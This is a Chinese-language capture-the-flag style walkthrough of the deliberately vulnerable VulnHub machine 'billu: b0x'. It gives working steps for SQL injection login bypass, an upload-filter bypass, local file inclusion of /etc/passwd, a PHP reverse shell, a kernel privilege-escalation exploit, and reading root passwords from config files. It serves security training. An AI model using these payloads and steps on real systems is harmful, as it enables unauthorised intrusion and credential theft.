靶机地址：[billu: b0x ~ VulnHub](https://vulnhub.com/entry/billu-b0x,188/)
导入时需要选择包含所有网卡的MAC地址
主机发现、端口扫描、服务枚举
```Shell
sudo arp-scan -l
sudo nmap -p- 192.168.1.40
sudo nmap -p22,80 -sV 192.168.1.40
# 22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
# 80/tcp open  http    Apache httpd 2.2.22 ((Ubuntu))
```
先访问Web服务看看，是一个登录界面，提示了需要SQL注入
先用BurpSuite拦截下请求保存到 `request.txt` ，用 `sqlmap` 尝试一下
```Shell
sqlmap -r request.txt -p "un,ps"
```
没有成功，使用BurpSuite暴力枚举，`Intruder` 模块的 Attack Type 选择 `Cluster boomb` 。
用户名字典选择 `Runtime file` ，使用 `seclists` 中的 `Generic-SQLi.txt`
密码字典选择Burp自带的 `Fuzzing - SQL injection`
跑了一会儿就跑出结果了，如
```
or 0=0 #
\
```
成功登录
添加用户功能是一个表单，并且可以上传文件
尝试上传webshell，响应只允许png/jpg/gif，尝试绕过
先修改MIME-Type，失败了；改下文件名试试，也失败了；再改文件头部，加上 `GIF89a;` ，也失败了。
同时修改文件名和文件内容，可以成功上传
因为改了文件名，暂时没有办法直接利用，看看能不能找到文件包含漏洞
web路径扫描
```Shell
sudo dirsearch -u http://192.168.1.40
# /add.php /add /c /images/ /in /phpmy/ /show /test /test.php
```
找到了一些路径，挨个尝试一下
`/add.php` 打开是刚才页面 `/panel.php` 中的一部分内容，合理猜测刚才的页面存在文件包含，尝试参数
```
load=../../etc/passwd&continue=continue
```
果然存在本地文件包含
```
root:x:0:0:root:/root:/bin/bash
ica:x:1000:1000:ica,,,:/home/ica:/bin/bash
```
等内容，看看可不可以远程文件包含
```
load=http://192.168.1.40/uploaded_images/one.gif&continue=continue
```
失败了，再试试利用本地的
```
load=uploaded_images/one.gif?cmd=id&continue=continue
load=uploaded_images/one.gif&continue=continue&cmd=id
```
都是失败了，换个思路，直接上传一个反弹Shell的php内容，直接调用，而不是通过参数
```Shell
cp /usr/share/webshells/php/php-reverse-shell.php .
```
编辑一下，修改IP和端口号，上传、访问
```
load=uploaded_images/reverse_shell.gif&continue=continue
```
成功获取到了反弹shell
提权
```Shell
uname -a
# Linux indishell 3.13.0-32-generic #57~precise1-Ubuntu SMP Tue Jul 15 03:50:54 UTC 2014 i686 athlon i386 GNU/Linux
lsb_release -a
# Description:    Ubuntu 12.04.5 LTS
```
利用代码
```Shell
searchsploit Linux 3.13
# Linux Kernel 3.13.0 < 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privi | linux/local/37292.c
cat /usr/share/exploitdb/exploits/linux/local/37292.c
```
靶机上有编译器，直接编译执行，提权成功。

`/in` 中有配置信息 `PHP Version 5.3.10-1ubuntu3.26` 等
`/phpmy` 是后台管理登录界面，后续可以考虑尝试暴破
`/test` 貌似是我们可以利用的页面，需要传一个 `file` 参数，加了还是提示没传
改成POST请求，这样就可以了
试一下
```
file=uploaded_images/one.gif&cmd=id
file=uploaded_images/reverse_shell.gif
```
没法直接利用，不是文件包含，是任意文件读取
看一下源码
```
file=index.php
```
有这样几行
```php
include('c.php');
include('head.php');

$uname=str_replace('\'','',urldecode($_POST['un']));
$pass=str_replace('\'','',urldecode($_POST['ps']));
$run='select * from auth where  pass=\''.$pass.'\' and uname=\''.$uname.'\'';
```
分析一下，SQL语句是
```SQL
select * from auth where pass=' + __pass__ + ' and uname=' + __uname__ + '
```
我们的注入内容将其变成了
```SQL
select * from auth where pass='\' and uname='or 0=0 #'
```
原来是通过 `\` 将后面的一个单引号转义了
再看一下 `c.php` ，有这样一段
```php
$conn = mysqli_connect("127.0.0.1","billu","b0x_billu","ica_lab");
```
有账号和密码，尝试登录 `/phpmy` 后台管理，登陆成功了
扫描一下路径
```Shell
sudo dirsearch -u http://192.168.1.40/phpmy
# /phpmy/config.inc.php
```
利用之前的任意文件读取漏洞读取这个文件的内容
```
file=phpmy/config.inc.php
```
有这样几行
```php
$cfg['Servers'][$i]['user'] = 'root';
$cfg['Servers'][$i]['password'] = 'roottoor';
```
尝试使用这个密码ssh连接
```Shell
ssh root@192.168.1.40
```
成功了